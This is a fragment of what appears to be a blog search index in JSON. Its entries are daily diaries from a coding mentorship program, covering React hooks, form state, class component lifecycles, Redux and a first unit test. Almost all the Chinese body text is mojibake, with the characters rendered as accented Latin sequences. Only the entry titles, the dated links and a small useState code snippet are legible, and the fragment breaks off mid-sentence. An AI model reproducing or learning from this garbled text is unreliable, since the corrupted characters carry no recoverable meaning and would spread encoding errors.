è®“åˆ¥äººä¸€ä¸‹å°±ç†è§£å®ƒåœ¨å¯«ä»€éº¼ï¼Œé€™å€‹æ‰æ˜¯æ¯”è¼ƒå²å®³çš„åœ°æ–¹ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠ week21 çµæŸã€‚","link":"/2022/04/18/mentor-program-day124/"},{"title":"mentor-program-day125","text":"å¾—åœ¨æ›´åŠªåŠ›ä¸€é»æ‰è¡Œã€‚ é€²åº¦ä»Šå¤©æŠŠ week21 çš„ä½œæ¥­éƒ½å®Œæˆäº†ã€‚ æ„Ÿè¦ºé€™ä¸€é€±é‚„è »è‰±è¾›çš„ï¼Œæ¥ä¸‹ä¾†æ‡‰è©²æœƒæ›´è‰±è¾›å§ï¼Œå¾—å¥½å¥½åŠ æ²¹æ‰è¡Œã€‚ å­¸åˆ°çš„äº‹æƒ…æ„Ÿè¦ºæœ€è¿‘é€²åº¦ä¸æ€éº¼å¥½ï¼Œå¶çˆ¾æœƒæä¸èµ·å‹ã€‚ä¸éé‚„æ˜¯æƒ³ç›¡åŠ›è®“æ¯ä¸€å¤©éƒ½èƒ½æœ‰ç”¢å‡ºï¼Œå„˜ç®¡å¦‚æ­¤ï¼Œé‚„æ˜¯æœƒè¦ºå¾—è‡ªå·±ä¸å¤ å¥½ï¼Œå¾ˆä¸æ‡‰è©²ã€‚ å¥½åƒæ‹‰å¾—æœ‰é»é ï¼Œé‚„æ˜¯ä¾†ç¨å¾®èªªä¸€ä¸‹ä»Šå¤©å¤§æ¦‚å­¸äº†ä»€éº¼å¥½äº†ã€‚ ä»Šå¤©åœ¨åšè¡¨å–®é©—è­‰æ™‚ï¼Œæœ¬ä¾†çš„æƒ³æ³•æ˜¯å¹«æ¯å€‹ &lt;input&gt; å»ºç«‹ä¸€å€‹è‡ªå·±çš„ stateï¼Œä¸éå¾Œä¾†æƒ³æƒ³ï¼Œä¹¾è„†ç”¨ä¸€å€‹ç‰©ä»¶ä¾†è¡¨ç¤ºæ‰€æœ‰å…ƒä»¶ä¼¼ä¹æœƒæ›´ç°¡æ½”ä¸€äº›ï¼Œåƒé€™æ¨£ï¼š 12345678const [formData, setFormData] = useState({ nickname: \"\", email: \"\", tel: \"\", type: \"\", learnFromWhere: \"\", suggestion: \"\",}) æ¥è‘—åªè¦æœ‰ä¸€å€‹ &lt;input&gt; æ”¹è®Šæ™‚å°±æ›´æ–°é€™å€‹ state å°±å¥½ï¼Œçœäº‹å¾ˆå¤šã€‚ è€Œä¸”é€™æ¨£çš„å¥½è™•æ˜¯å¦‚æœè¦é€ request çš„è©±å°±ä¸ç”¨å†å¦å¤–æ•´ç†æˆ Objectï¼Œåªè¦æ‹¿ç¾æˆçš„å°±å¥½ã€‚ é¡Œå¤–è©±æœ‰æ™‚å€™æœƒæ„Ÿåˆ°ç´¯ï¼Œä½†ç¾åœ¨æ˜¯æœ€è©²åŠªåŠ›çš„æ™‚å€™ã€‚ æœŸè¨±æ˜å¤©ä¹Ÿè¨±æœƒåšé»ç­†è¨˜ï¼Œä¹Ÿæ‡‰è©²æœƒé–‹å§‹é€²åˆ°ä¸‹ä¸€é€±çš„é€²åº¦ã€‚","link":"/2022/04/19/mentor-program-day125/"},{"title":"mentor-program-day127","text":"åŠ æ²¹ã€‚ é€²åº¦ä»Šå¤©èŠ±äº†äº›æ™‚é–“çœ‹å®˜æ–¹æ–‡ä»¶ï¼Œç¸½ç®—æ˜¯çœ‹å®Œäº†ï¼Œä¹Ÿåšäº†ç°¡çŸ­çš„ç­†è¨˜ï¼šReact é‡æ–°è¤‡ç¿’ hooks æ¥ä¸‹ä¾†å‰©ä¸‹ class component çš„éƒ¨åˆ†ï¼Œè¶•ç·ŠåŠ å¿«è…³æ­¥çœ‹ä¸€çœ‹ï¼Œå¸Œæœ›å¿«é»é€²å…¥ redux çš„éƒ¨åˆ†ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©é‡æ–°è¤‡ç¿’äº†å„ç¨® hookï¼Œæœ‰æŠŠä¸€äº›ä»¥å‰ä¸å¤ªæ˜¯å¾ˆç†Ÿçš„è§€å¿µçµ¦å¼„æ›´æ‡‚ä¸€äº›ï¼Œé †ä¾¿å­¸åˆ°äº†ä¸€å…©å€‹åŸæœ¬ä¸çŸ¥é“çš„ hookã€‚ å¤§æ¦‚å°±é€™æ¨£å§ï¼å…¶ä»–è©³ç´°éƒ½å¯«åœ¨ç­†è¨˜è£¡äº†ï¼Œé€™é‚Šå°±ä¸è´…è¿°ã€‚ é¡Œå¤–è©±ä¸€å®šè¦æˆåŠŸï¼ŒåŠ æ²¹ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠå‰©ä¸‹çš„ä½œæ¥­æå®šã€‚","link":"/2022/04/21/mentor-program-day127/"},{"title":"mentor-program-day126","text":"å¿«å®Œæˆäº†å§ã€‚ é€²åº¦ä»Šå¤©é–‹å§‹è·‘ week22 çš„é€²åº¦ï¼Œéƒ¨è½æ ¼çš„ä½œæ¥­åœ¨çœ‹èª²ç¨‹æ™‚å°±åšå¾—å·®ä¸å¤šäº†ï¼Œæ‰€ä»¥ä»Šå¤©åªæ˜¯å†åŠ ä¸Šåˆ†é çš„åŠŸèƒ½ï¼Œè·Ÿä¸€äº› UI çš„èª¿æ•´ï¼š æ¥è‘—é–‹å§‹å»çœ‹ å®˜æ–¹æ–‡ä»¶ï¼ŒæŠŠä¸€äº›é—œæ–¼ hook çš„æ¦‚å¿µè£œå¾—æ›´æ¸…æ¥šä¸€äº›ï¼Œå¸Œæœ›æ˜å¤©çœ‹å®Œå¾Œèƒ½æŠŠç°¡ç­”é¡Œæå®šã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©åšçš„äº‹æƒ…è·Ÿä»¥å‰å·®ä¸å¤šï¼Œä½†è¦æ”¹ç”¨ React çš„æ–¹å¼ä¾†æ€è€ƒé€™æ¨£å­ï¼Œä»€éº¼æ±è¥¿è©²æ˜¯ stateï¼Ÿé€™å€‹å•é¡Œæœ‰æ™‚å€™å¯ä»¥ç‰½æ‰¯åˆ°è »å¤šç´°ç¯€çš„ã€‚ ä½†æˆ‘è¦ºå¾—æ¯”è¼ƒé›£çš„åœ°æ–¹æ˜¯å„ªåŒ–çš„éƒ¨åˆ†å§ï¼Œè¦æ€éº¼æ´»ç”¨ useCallback å’Œ memo ç­‰ç­‰ç›¸é—œçš„ hook é‚„è »éœ€è¦äº†è§£ React çš„æ¸²æŸ“æ©Ÿåˆ¶çš„ï¼Œä¸æ‡‚çš„è©±å°±æœƒä¸çŸ¥é“ä»€éº¼æ™‚å€™è©²åŠ ï¼Œä»€éº¼æ™‚å€™ä¸è©²ï¼Œæˆ–ç”šè‡³äº‚åŠ åŠ åˆ°ç¨‹å¼ç›´æ¥å£æ‰ä¹Ÿæœ‰å¯èƒ½ã€‚ ç¸½ä¹‹ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†èƒ½æŠŠ React ç·´çš„æ›´ç²¾æ·±ä¸€äº›ã€‚ é¡Œå¤–è©±æˆ‘æˆé•·äº†å¾ˆå¤šå—ï¼Ÿä¸çŸ¥é“ç¾åœ¨çš„è‡ªå·±åœ¨åˆ¥äººçš„çœ¼ä¸­æ˜¯ä»€éº¼æ¨¡æ¨£ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ hook å¼„ç†Ÿï¼Œæ¥è‘—èƒ½é€²åˆ° redux çš„ç’°ç¯€å°±æ›´å¥½äº†ã€‚","link":"/2022/04/20/mentor-program-day126/"},{"title":"mentor-program-day128","text":"æœ€å¾Œä¸€å¡Šæ‹¼åœ–ã€‚ é€²åº¦ä»Šå¤©å†æ¬¡è¤‡ç¿’äº† class component çš„ç”Ÿå‘½é€±æœŸï¼Œä¹Ÿå¯«äº†ç­†è¨˜ï¼šReact é‡æ–°è¤‡ç¿’ class component çš„ç”Ÿå‘½é€±æœŸ ç¸½ç®—æ˜¯å®Œæˆäº† week22ï¼Œæ¥è‘—é–‹å§‹æ­£å¼å­¸ç¿’ Redux çš„ä½¿ç”¨ã€‚ å­¸åˆ°çš„äº‹æƒ…é›–ç„¶æœ‰äº›è§€å¿µæ„Ÿè¦ºè¦å¯¦éš›ç¢°åˆ°æ‰èƒ½å¸æ”¶æ›´å¤šï¼Œä½†ç›¸ä¿¡å…ˆç†è§£å€‹æ¦‚å¿µä¹Ÿæ˜¯æœ‰å¹«åŠ©çš„å§ã€‚ ä»Šå¤©é‡æ–°ç·´ç¿’äº† class çš„ç”Ÿå‘½é€±æœŸï¼Œæ„Ÿè¦ºæœ‰æ›´ç†è§£ä¸€äº›ï¼Œä¸éä¹Ÿé«”æœƒåˆ°ç‚ºä»€éº¼ hook æ¨å‡ºå¾Œå°±å¾ˆå°‘äººåœ¨å¯« class component äº†ï¼Œå› ç‚ºçœŸçš„ç°¡æ½”ä¹Ÿç›´è¦ºå¾ˆå¤šã€‚ ç›®å‰å­¸çš„åŸºæœ¬ redux æ„Ÿè¦ºé‚„ä¸ç®—å¤ªé›£ï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯æœ‰åŸ‹è—ä»€éº¼å¤§é­”ç‹åœ¨è£¡é¢ï¼Œçœ‹å‰äººåœ¨é€™å€‹æ™‚æœŸéƒ½å“€é´»éé‡ï¼Œå¸Œæœ›è‡ªå·±ä¸æœƒèµ°å¾—å¤ªè‰±è¾›ã€‚ é¡Œå¤–è©±é€™æ˜¯æœ€å¾Œä¸€å¡Šæ‹¼åœ–äº†ï¼Œå¸Œæœ›ä¸€åˆ‡é †åˆ©ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤© redux é †åˆ©ã€‚","link":"/2022/04/22/mentor-program-day128/"},{"title":"mentor-program-day129","text":"æ¯å€‹äººéƒ½æœ‰è‡ªå·±æ“…é•·çš„é ˜åŸŸï¼Œå¸Œæœ›æˆ‘æ˜¯å±¬æ–¼æœƒå¯« JS çš„é‚£å€‹ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒçœ‹ Redux çš„å½±ç‰‡ï¼Œç›®å‰å­¸çš„éƒ½é‚„ç®—é †åˆ©ï¼Œä¹‹å¾Œæœƒåœ¨æŠŠæ•´ç†å¾Œçš„ç­†è¨˜æ”¾ä¸Šä¾†ã€‚ ä¹Ÿé †ä¾¿çœ‹äº†ä¸€ä¸‹é¡å¤–çš„å½±ç‰‡ï¼Œå­¸åˆ°äº†æ–°çš„ VS code çš„æŠ€å·§ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©æœ‰è·Ÿè‘—å½±ç‰‡åšç·´ç¿’ï¼Œæ„Ÿè¦ºå° Redux æœ‰è¶Šä¾†è¶Šç†Ÿæ‚‰ä¸€é»ã€‚ é›–ç„¶ç¢ºå¯¦å°±è·Ÿ Huli èªªçš„ä¸€æ¨£ï¼Œç•¶å°ˆæ¡ˆå°çš„æ™‚å€™ Redux åè€Œæ˜¯ä¸€ç¨®éº»ç…©ï¼Œä¸éç•¶å°ˆæ¡ˆå¤§ä»¥å¾Œ Redux å¸¶ä¾†çš„æ•ˆç›Šæ‡‰è©²é‚„è »å¤§çš„ï¼Œæ€ªä¸å¾—å‡ºå¤–æ‰¾å·¥ä½œå¹¾ä¹éƒ½å¸Œæœ›ä½ æœƒ Redux é€™ç¨®æ±è¥¿ã€‚ å·®ä¸å¤šå°±é€™æ¨£å§ï¼å…¶ä»–çš„éƒ½å¯«åœ¨ç­†è¨˜è£¡äº†ã€‚ é¡Œå¤–è©± å¾ˆå¤šå·¥ç¨‹å¸«éƒ½åªæœƒé‡å»ºï¼Œè€Œä¸æœƒé‡æ§‹ã€‚ é€™å¥è©±æ˜¯ä¾†è‡ª å…©å¹´éå¾Œï¼Œæˆ‘èƒ½å¤ è¢«ç¨±ç‚ºè³‡æ·±å·¥ç¨‹å¸«äº†å—ï¼Ÿ è£¡é¢æåˆ°çš„ï¼Œè¦ºå¾—è‡ªå·±ä¸æ‡‰è©²ä¹Ÿæˆç‚ºé€™ç¨®äººï¼Œæ‰€ä»¥å¾—å¤šåŠ æ²¹æ‰è¡Œã€‚ æœŸè¨±å¸Œæœ›æ˜å¤© Redux é †åˆ©ï¼Œå¦‚æœèƒ½ç›¡å¿«æŠŠèª²ç¨‹çœ‹å®Œçš„è©±å°±æ›´å¥½äº†ã€‚","link":"/2022/04/23/mentor-program-day129/"},{"title":"mentor-program-day13","text":"ç–²å€¦çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©æŠŠ [ALG101] çœ‹åˆ° week2 çš„é€²åº¦äº†ï¼ˆé™¤äº†ä¸€å…©é¡Œé¡Œç›®é‚„æ²’åšï¼‰ã€‚ç·Šæ¥è‘—é–‹å§‹é€²å…¥ week3 çš„é€²åº¦ï¼Œçœ‹äº†ä¸€é» [JS102] çš„å…§å®¹ï¼Œç›®å‰çœ‹åˆ° 36%ã€‚ ä¸€æ¨£ç´€éŒ„ä¸€ä¸‹ç­†è¨˜çš„éƒ¨åˆ†ï¼š å°å‡ºæ˜Ÿæ˜Ÿï¼ˆé‡‘å­—å¡”ï¼‰ æ±‚å‡º 1-100 çš„å¹³æ–¹æ•¸ æ¨¡çµ„åŒ–çš„è¼¸å‡ºèˆ‡è¼¸å…¥ å¼•ç”¨æ¨¡çµ„çš„æ³¨æ„äº‹é … npm å°çŸ¥è­˜ ä»Šå¤©çš„é€²åº¦æ‡‰è©²é‚„è¡Œå§ï¼Œä¸éä¹Ÿæ¯”è¼ƒç–²å€¦ä¸€äº›ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨ç·´ç¿’ LIOJ ä¸Šçš„é¡Œç›®æ™‚é«”æœƒåˆ°ä¸€ä»¶äº‹æƒ…ï¼Œè·Ÿæ•¸å­¸æœ‰é—œçš„é¡Œç›®åšèµ·ä¾†ç‰¹åˆ¥å¡ï¼Œåƒ å°å‡ºæ˜Ÿæ˜Ÿï¼ˆé‡‘å­—å¡”ï¼‰ è·Ÿ æ±‚å‡º 1-100 çš„å¹³æ–¹æ•¸ å°±æ˜¯å€‹è »å¥½çš„ä¾‹å­ã€‚ ä¹Ÿè¨±é€™å…©é¡Œçœ‹èµ·ä¾†è±ªä¸èµ·çœ¼ï¼Œä½†è®“æˆ‘æ„Ÿåˆ°å›°é›£çš„åœ°æ–¹åœ¨æ–¼ã€Œæˆ‘çš„è…¦çŸ¥é“è©²æ€éº¼åšï¼Œä½†å»ä¸çŸ¥é“æ€éº¼è½‰æ›æˆç¨‹å¼ç¢¼ã€ã€‚å°±å¥½åƒä½ çŸ¥é“æœ‰å€‹è¦å¾‹æ˜¯ï¼š f(1) = 1 f(2) = 3 f(3) = 5 ä½†ä½ å°é€™ä¸­é–“çš„é‹ç®—éç¨‹æ¯«ç„¡é ­ç·’ï¼Œæ‰¾ä¸å‡ºè¦å¾‹æ€§ã€‚ åˆæˆ–è€…æ˜¯ä½ çŸ¥é“ä¸€å€‹æ•¸å­—åœ¨é–‹æ ¹è™Ÿå¾Œä¸æ˜¯æ•´æ•¸å°±ä»£è¡¨é€™å€‹æ•¸å­—ä¸æ˜¯ã€Œå¹³æ–¹æ•¸ã€ï¼ˆä¾‹å¦‚ 3 é–‹æ ¹è™Ÿä¸æ˜¯æ•´æ•¸ï¼Œæ‰€ä»¥ 3 å°±ä¸æ˜¯å¹³æ–¹æ•¸ï¼‰ï¼Œä½†ä½ ä¾ç„¶æ¯«ç„¡é ­ç·’ï¼Œå› ç‚ºåœ¨ JavaScript è£¡ä¸¦æ²’æœ‰ä¸€å€‹ã€Œåˆ¤æ–·æ•¸å­—æ˜¯æ•´æ•¸é‚„æ˜¯æµ®é»æ•¸ã€çš„é‹ç®—å­ã€‚ ç•¶ç„¶ï¼Œé€™äº›é¡Œç›®ä¸¦ä¸ä¸€å®šè¦ç”¨é€™å…©ç¨®æ–¹å¼æ‰èƒ½è§£å‡ºä¾†ã€‚æˆ‘æƒ³èªªçš„æ˜¯æœ‰äº›é¡Œç›®ä½ å¯èƒ½ç¬¬ä¸€å€‹æœƒæƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯ç”¨æ•¸å­¸ä¾†è™•ç†ï¼Œå¯æ˜¯ä½ åŒæ™‚ä¹Ÿç™¼ç¾è‡ªå·±ä¸çŸ¥é“è©²æ€éº¼å¯¦éš›é‹ç”¨ï¼Œé€™æœƒè®“äººç‰¹åˆ¥çš„æœ‰æ„Ÿè§¸ã€‚ ä¹Ÿè¨±ç¸½æœ‰ä¸€å¤©æˆ‘è©²å›å»åŠ å¼·æˆ‘çš„æ•¸å­¸ï¼Œä½†ç¾åœ¨å¾—å…ˆåŠªåŠ›æŠŠè¨ˆç•«çµ¦è·‘å®Œæ‰è¡Œã€‚ é™¤äº†åšé¡Œç›®ä¹‹å¤–ï¼Œä»Šå¤©ä¹Ÿå­¸äº†ä¸€é»æ¨¡çµ„åŒ–çš„æ‡‰ç”¨ï¼Œä¹Ÿæœ‰ä¸€é»æ›´æ·±çš„èªè­˜ã€‚é›–ç„¶æœ‰ä¸€ä»¶äº‹æƒ…è®“æˆ‘è€¿è€¿æ–¼æ‡·ï¼Œå°±æ˜¯æˆ‘çœ‹ä¸å¤ªæ‡‚ webpack æ–°æ‰‹æ•™å­¸ä¹‹æ·ºè«‡æ¨¡çµ„åŒ–èˆ‡ snowpack æ–‡ç« ä¸­å¯¦ä½œ require è·Ÿ module çš„éƒ¨åˆ†ã€‚å¸Œæœ›ä¹‹å¾Œæˆ‘èƒ½å†å›ä¾†å¼„å¾—æ›´æ¸…æ¥šï¼Œä¹Ÿè©¦è‘—è‡ªå·±å¯¦ä½œçœ‹çœ‹ã€‚ å¦å¤–ç‰¹åˆ¥çš„äº‹æƒ…æ˜¯ä»Šå¤©æ˜¯ç¬¬ä¸€æ¬¡ç”¨ yarn é€™å€‹ package managerã€‚å…¶å¯¦ä»¥å‰å°±ç¶“å¸¸è½åˆ°é€™å€‹åå­—ï¼Œä¸éåœ¨ npm å…¶å¯¦å°±å¾ˆå¤ ç”¨çš„å‰æä¹‹ä¸‹ï¼Œä¸€ç›´æ²’æœ‰æ©Ÿæœƒå»ç¢°åˆ°ï¼Œä»Šå¤©ç®—æ˜¯è¢«èª²ç¨‹çµ¦ç‰½èµ·ç´…ç·šå§ï¼ˆæˆ‘ä¸çŸ¥é“æˆ‘åœ¨å½¢å®¹ä»€éº¼ï¼‰ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œä»Šå¤©æ˜¯å€‹è »æœ‰è¶£ä½†ä¹Ÿç›¸å°ç–²å€¦çš„ä¸€å¤©ï¼Œä¹Ÿè¨±æ˜¯èª²ç¨‹çš„é€²åº¦æ…¢æ…¢åŠ é‡äº†ï¼Œå¾—å¥½å¥½åŠ æ²¹æ‰è¡Œã€‚ é¡Œå¤–è©±å¾Œå¤©å°±æ˜¯è–èª•ç¯€äº†ï¼Œé›–ç„¶é‚„æ²’æœ‰è¨ˆç•«é‚£ä¸€å¤©è¦åšä»€éº¼ï¼Œä½†é‚„æ˜¯æœƒæœ‰é»æœŸå¾…ã€‚ è–èª•ç¯€æ˜¯æˆ‘å¥³æœ‹å‹å¾ˆå–œæ­¡çš„ä¸€å€‹ç¯€æ—¥ã€‚å…¶å¯¦æˆ‘æœ¬ä¾†æ˜¯å€‹ä¸æ€éº¼éç¯€çš„äººï¼Œä½†åœ¨èªè­˜äº†å¥³æœ‹å‹å¾Œï¼Œä¹Ÿé€æ¼¸å–œæ­¡ä¸Šè–èª•ç¯€çš„æ°£æ¯ï¼›ä¹Ÿå–œæ­¡ä¸Šäº†ã€Œè–‘é¤…ã€é€™å€‹åæ‡‰å¾ˆå…©æ¥µçš„é¤…ä¹¾ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ [JS102] çœ‹å®Œï¼Œè·ŸæŠŠ [ALG101] çš„é€²åº¦çµ¦è·Ÿä¸Šï¼Œå¤§æ¦‚å°±æ˜¯é€™æ¨£å§ï¼","link":"/2021/12/24/mentor-program-day13/"},{"title":"mentor-program-day130","text":"Redux çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©å†æ¬¡ç·´ç¿’ Redux çš„ä½¿ç”¨ï¼Œå½±ç‰‡çš„éƒ¨åˆ†çœ‹åˆ°äº† Redux toolkit çš„éƒ¨åˆ†ï¼Œä½†æ„Ÿè¦ºå° toolkit çš„åšæ³•æœ‰é»ä¼¼æ‡‚éæ‡‚çš„ï¼Œæ‰€ä»¥åˆé‡æ–°è·‘äº†ä¸€é Redux çš„åŸºæœ¬æµç¨‹ï¼Œä¹Ÿå¯«äº†ä¸€ç¯‡ç­†è¨˜ï¼šåˆæ¢ Redux æ˜å¤©æ‰“ç®—åœ¨é‡æ–°è·‘ä¸€æ¬¡ React Redux çš„æµç¨‹ï¼Œå¯«ä¸€ç¯‡å®Œæ•´çš„ç­†è¨˜ä¾†è¨˜éŒ„ï¼Œé †ä¾¿è®€ä¸€ä¸‹å®˜æ–¹æ–‡ä»¶ã€‚ å­¸åˆ°çš„äº‹æƒ…ä¸ç®¡æ˜¯å­¸ Redux é‚„æ˜¯å…¶ä»–çš„å·¥å…·ï¼Œéƒ½æœƒé«”é©—åˆ°å…¶å¯¦èƒŒå¾Œæœ€å¼·å¤§çš„æ±è¥¿é‚„æ˜¯ JSï¼Œæˆ–è€…èªªæ˜¯ç¨‹å¼èªè¨€ã€‚ å¾ˆå¤šæ±è¥¿åœ¨é‚„æ²’å„ªåŒ–ä¹‹å‰ï¼Œéƒ½æœƒæœ‰ç¹ç‘£çš„ code æˆ–æ˜¯å‰ç½®ä½œæ¥­å¾—è™•ç†ã€‚æ‰€ä»¥ç¸½æœƒæœ‰äººæƒ³åˆ°ã€Œé˜¿ï¼Œæ—¢ç„¶ JS å¯ä»¥â€¦ï¼Œå€’ä¸å¦‚å°±è®“ JS ä¾†è™•ç†å§ï¼ã€ç­‰ç­‰ä¹‹é¡çš„ã€‚æˆ–è€…èªªï¼Œå…¶å¯¦ä¹Ÿä¸è¦‹å¾—æ˜¯ JSï¼Œè€Œæ˜¯å¯«ç¨‹å¼èªè¨€æœ¬ä¾†å°±æœ‰ä¸€äº› patternï¼Œä½ æœƒçŸ¥é“ç”¨ã€Œç´”å­—ä¸²ã€ä¾†ç•¶ä½œ parameter è‚¯å®šæœƒè¸©åˆ°ä¸€äº›åœ°é›·ï¼Œæ‰€ä»¥æ›´å¥½çš„åšæ³•æ˜¯ç”¨è®Šæ•¸ä¾†å–ä»£ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œç•¶ä½ ç¨‹å¼å¯«å¾—è¶Šä¹…ï¼Œå°±æœƒåœ¨ç„¡å½¢ä¸­ç”¢ç”Ÿä¸€é» senseï¼Œä¹Ÿä¸å¤ªçŸ¥é“è©²æ€éº¼å½¢å®¹é€™ç¨®æ„Ÿè¦ºã€‚ é¡Œå¤–è©±å¥³æœ‹å‹çš„ç”Ÿæ—¥è¦åˆ°äº†ï¼Œå¸Œæœ›ç”Ÿæ—¥é€™å¤©å¥¹æœƒæ˜¯ä¸–ç•Œä¸Šæœ€å¿«æ¨‚çš„äººã€‚ æœŸè¨±æ˜å¤©å¸Œæœ›æŠŠ Redux toolkit ææ‡‚ï½","link":"/2022/04/24/mentor-program-day130/"},{"title":"mentor-program-day131","text":"ç¹¼çºŒå‘å‰èµ°ã€‚ é€²åº¦é€™å¹¾å¤©æŠŠç­†è¨˜çµ¦æ•´ç†ä¸€ä¸‹ï¼ŒRedux çš„éƒ¨åˆ†ç®—æ˜¯éƒ½åšå®Œäº†å§ï¼š ç”¨ react-redux æŠŠ redux è·Ÿ React ä¸²æ¥èµ·ä¾†ï¼ˆHooks ç‰ˆæœ¬ï¼‰ ç”¨ react-redux æŠŠ redux è·Ÿ React ä¸²æ¥èµ·ä¾†ï¼ˆConnect ç‰ˆæœ¬ï¼‰ ç”¨ Redux-toolkit ä¸²æ¥ React å’Œ Redux Redux middleware å‰©ä¸‹çš„å°±æ˜¯é‚Šå¯¦æˆ°é‚Šç·´ç¿’äº†ï¼Œå¸Œæœ›èƒ½å¤ åšå¥½ï¼ŒåŠ æ²¹ã€‚ å­¸åˆ°çš„äº‹æƒ…è¦ºå¾— Redux çš„æ¦‚å¿µæœ¬èº«ä¸ç®—è¤‡é›œï¼Œæœ¬è³ªå°±æ˜¯ dispatchã€store å’Œ action é€™å¹¾å€‹æ±è¥¿åœ¨é‹ä½œï¼Œåªæ˜¯ç•¶è¦ç®¡ç†çš„ state è¶Šä¾†è¶Šå¤šæ™‚å°±æœƒé€æ¼¸è¤‡é›œï¼Œæ‰€ä»¥å¤§å®¶æ‰æœƒèªª Redux é›£å­¸å§ï¼Œä½•æ³å¾Œä¾†é‚„å»¶ä¼¸å‡º Redux saga æˆ– observable é€™äº›æ±è¥¿ï¼ŒæŠŠæ•´é«”çš„é›£åº¦åˆåœ¨å¾€ä¸Šæå‡äº†ä¸€å€‹ levelã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œå¸Œæœ›èƒ½æ…¢æ…¢ç†Ÿæ‚‰ï¼Œç•¢ç«Ÿé€™äº›æ‡‰è©²æ˜¯èº«ç‚ºå‰ç«¯å¿…é ˆçŸ¥é“çš„çŸ¥è­˜ã€‚ é¡Œå¤–è©±èª²ç¨‹å³å°‡çµæŸï¼Œä¸çŸ¥é“æœªä¾†æ±‚è·æ˜¯å¦ä¹Ÿèƒ½åƒç¾åœ¨ä¸€æ¨£é †åˆ©ï¼Œå¸Œæœ›é€™å¹¾å€‹æœˆçš„åŠªåŠ›æ²’æœ‰ç™½è²»ã€‚ æœŸè¨±æ˜å¤©æ‡‰è©²å°±èƒ½æŠŠèª²ç¨‹çœ‹å®Œäº†ï¼Œå¸Œæœ›æœ€å¾Œçš„å¹¾å€‹ä½œæ¥­åšçš„é †åˆ©ã€‚","link":"/2022/04/26/mentor-program-day131/"},{"title":"mentor-program-day132","text":"ä¹Ÿè¨±æ˜¯æ™‚å€™ç•«ä¸‹å¥é»äº†ã€‚ æœ€å¾Œæƒ³èªªçš„ä¸€äº›è©±é›–ç„¶ç¾åœ¨çš„æˆ‘é‚„æ²’æœ‰æŠŠæ‰€æœ‰èª²ç¨‹çš„ä½œæ¥­éƒ½çµ¦åšå®Œï¼Œä½† ç¨‹å¼å°å¸«å¯¦é©—è¨ˆç•« æƒ³å¸¶çµ¦å­¸ç”Ÿçš„å…§å®¹ï¼Œæˆ‘æƒ³æˆ‘å·²ç¶“å·®ä¸å¤šéƒ½æ¥æ”¶åˆ°äº†ã€‚ æ¥ä¸‹ä¾†çš„æ—¥å­ï¼Œä¸æœƒå†æœ‰äººå¸¶è‘—æˆ‘ï¼Œå‘Šè¨´æˆ‘ä¸‹ä¸€æ­¥è©²å¾€å“ªè£¡èµ°ï¼Œå…¨éƒ¨éƒ½å¾—é æˆ‘è‡ªå·±äº†ã€‚ å¾è¸å…¥é€™ä¸€è¡Œé–‹å§‹æˆ‘å°±æ˜ç™½ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯å­¸ç¿’æ˜¯æ°¸ç„¡æ­¢ç›¡çš„ã€‚ä¹Ÿè¨±æˆ‘å®Œæˆäº†é€™ä»½è¨ˆç•«ï¼Œä¹Ÿæˆé•·äº†ä¸å°‘ã€‚ä½†é€™ä¸¦ä¸æ˜¯å­¸ç¿’çš„çµ‚é»ï¼Œè€Œæ˜¯é‚å‘æœªä¾†çš„å¦ä¸€å€‹èµ·é»ã€‚ ç¸½ä¹‹ï¼Œç›®å‰åªæ˜¯æƒ³èªªï¼Œé€™ä»½èª²ç¨‹çš„ç´€éŒ„å·®ä¸å¤šå°±åˆ°æ­¤ç‚ºæ­¢äº†ï¼Œæˆ‘å¾ˆæ…¶å¹¸åœ¨é€™ 132 å¤©å…§å­¸åˆ°äº†é€™éº¼å¤šè¶…ä¹æˆ‘é æœŸçš„çŸ¥è­˜ã€‚æ¥ä¸‹ä¾†çš„å­¸ç¿’æœƒæ˜¯å¦ä¸€å€‹å…¨æ–°é–‹å§‹ï¼Œå¸Œæœ›æˆ‘çœŸçš„å·²ç¶“å­¸æœƒè‡ªä¸»å­¸ç¿’çš„é€™ä»½èƒ½åŠ›ï¼Œé€™æ‰æ˜¯æœ€é‡è¦çš„ä¸€ä»¶äº‹æƒ…ã€‚ é™„è¨»ï¼šä¹‹å¾Œç­‰æˆ‘å®Œæˆæ‰€æœ‰ä½œæ¥­å¾Œï¼Œæœƒåœ¨å›ä¾†æŠŠé€™ç¯‡çµå°¾å¿ƒå¾—æ‰“çš„æ›´å®Œæ•´ä¸€äº›å§ï¼Œä½†ç›®å‰å°±å…ˆé€™æ¨£å­ï¼","link":"/2022/04/27/mentor-program-day132/"},{"title":"mentor-program-day14","text":"Merry christmas. é€²åº¦ä»Šå¤©æŠŠ [JS102] çœ‹åˆ°äº† 64%ã€‚é›–ç„¶é€²åº¦æ„Ÿè¦ºä¸å¤šï¼Œä½†æ˜¯å­¸äº†è »å¤šæ–°æ±è¥¿ï¼š ç¬¬ä¸€æ¬¡åš Unit test npm script èˆ‡ npx çš„ç”¨é€” ES6 çš„ let èˆ‡ const ES6 çš„å­—ä¸²æ¨¡æ¿ ES6 çš„è§£æ§‹è³¦å€¼ ES6 å±•é–‹é‹ç®—å­ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©æœ€æœ‰è¶£çš„æ‡‰è©²æ˜¯ Unit test å§ï¼Œç¬¬ä¸€æ¬¡åšçš„æ„Ÿè¦ºé‚„è 